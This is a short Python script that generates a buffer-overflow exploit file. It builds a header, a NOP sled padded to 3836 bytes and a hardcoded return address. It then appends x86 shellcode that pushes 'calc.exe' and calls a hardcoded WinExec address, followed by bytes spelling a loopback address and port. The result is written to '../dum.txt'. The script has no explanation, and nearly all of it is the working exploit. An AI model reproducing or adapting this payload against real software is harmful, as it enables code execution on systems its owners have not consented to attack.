#!/usr/bin/python3
import struct
import sys
import ctypes

shellcode =""
shellcode += "\x1D\x0F\x00\x00"
shellcode += (
      "\xEF\xDF\x01\x03"
)
shellcode += (
      "\x3E\x49\x67\xC1"
)
shellcode += "\x90"*(3836-len(shellcode))
print(len(shellcode))
shellcode += "\x63\xF0\x3E\x77"


shellcode += (
      "\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B"
      "\xC4\x50\xB8\x20\x47\x1D\x77\xFF\xD0\x33\xC0\x50\xB8\x30\x78\x1F"
      "\x77\x20\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31\x20\x35\x35\x35\x35\x61\x61"
)
print(len(shellcode))

shellcode = shellcode.encode('latin-1')

shellcode = bytearray(shellcode)
# Save the binary code to file
with open('../dum.txt', 'wb') as f:
      f.write(shellcode)
